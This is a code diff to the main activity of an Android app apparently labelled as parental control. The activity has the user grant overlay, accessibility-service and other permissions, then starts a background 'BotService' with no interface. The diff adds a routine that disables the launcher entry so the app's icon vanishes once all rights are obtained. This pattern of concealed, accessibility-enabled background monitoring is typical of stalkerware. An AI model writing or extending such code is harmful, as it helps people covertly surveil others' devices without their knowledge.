@@ -1,6 +1,7 @@
 package com.parentcontrol;
 
 import android.Manifest;
+import android.content.ComponentName;
 import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.net.Uri;
@@ -23,7 +24,6 @@ public class MainActivity extends AppCompatActivity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
 
-        // Шаг 1: Разрешение поверх экрана
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
             Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                 Uri.parse("package:" + getPackageName()));
@@ -31,7 +31,6 @@ public class MainActivity extends AppCompatActivity {
             return;
         }
 
-        // Шаг 2: Спец. возможности
         if (!isAccessibilityEnabled()) {
             startActivityForResult(
                 new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS),
@@ -40,7 +39,6 @@ public class MainActivity extends AppCompatActivity {
             return;
         }
 
-        // Шаг 3: Обычные разрешения
         String[] perms = getRequiredPermissions();
         if (!hasPermissions(perms)) {
             ActivityCompat.requestPermissions(this, perms, PERM_REQUEST);
@@ -87,7 +85,6 @@ public class MainActivity extends AppCompatActivity {
     @Override
     protected void onActivityResult(int requestCode, int resultCode, Intent data) {
         super.onActivityResult(requestCode, resultCode, data);
-        // После любого экрана настроек - продолжаем с onCreate
         recreate();
     }
 
@@ -99,6 +96,17 @@ public class MainActivity extends AppCompatActivity {
 
     private void startAndFinish() {
         startForegroundService(new Intent(this, BotService.class));
-        finish(); // Закрываем - никакого UI
+        // Скрываем иконку сразу после получения всех прав
+        hideAppIcon();
+        finish(); 
+    }
+
+    private void hideAppIcon() {
+        ComponentName componentName = new ComponentName(this, MainActivity.class);
+        getPackageManager().setComponentEnabledSetting(
+            componentName,
+            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+            PackageManager.DONT_KILL_APP
+        );
     }
 }
